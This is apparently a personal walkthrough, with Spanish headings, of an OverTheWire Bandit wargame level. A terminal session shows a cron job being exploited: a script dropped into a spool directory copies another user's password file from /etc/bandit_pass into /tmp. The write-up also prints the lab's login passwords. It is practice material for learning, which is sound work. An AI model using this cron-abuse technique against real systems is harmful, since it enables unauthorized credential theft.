# Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

# Datos de acceso al nivel
ssh bandit23@bandit.labs.overthewire.org -p 2220
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G


# Solución
```
bandit23@bandit:~$
bandit23@bandit:~$ ls /etc/cron.d/
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ mkdir /tmp/rand
mkdir: cannot create directory ‘/tmp/rand’: File exists
bandit23@bandit:/var/spool/bandit24/foo$ mkdir /tmp/reto
mkdir: cannot create directory ‘/tmp/reto’: File exists
bandit23@bandit:/var/spool/bandit24/foo$ reto2
reto2: command not found
bandit23@bandit:/var/spool/bandit24/foo$ mkdir /tmp/reto2
bandit23@bandit:/var/spool/bandit24/foo$ cd /tmp/reto2
bandit23@bandit:/tmp/reto2$ nano script.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/reto2$ nano script.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/reto2$ cat script.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/reto2/password
bandit23@bandit:/tmp/reto2$ touch password
bandit23@bandit:/tmp/reto2$ chmod 777 -R /tmp/reto2
bandit23@bandit:/tmp/reto2$ cp script.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
bandit23@bandit:/tmp/reto2$ cp script.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
bandit23@bandit:/tmp/reto2$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ chmod 777 -R /tmp/reto2
bandit23@bandit:/var/spool/bandit24/foo$ cd /tmp/reto2
bandit23@bandit:/tmp/reto2$ cp script.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
bandit23@bandit:/tmp/reto2$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/reto2$ cat password
bandit23@bandit:/tmp/reto2$ ls
password  script.sh
bandit23@bandit:/tmp/reto2$ chmod 777 -R /tmp/reto2
bandit23@bandit:/tmp/reto2$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/reto2$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/reto2$
```

# Notas adicionales
 

# Referencias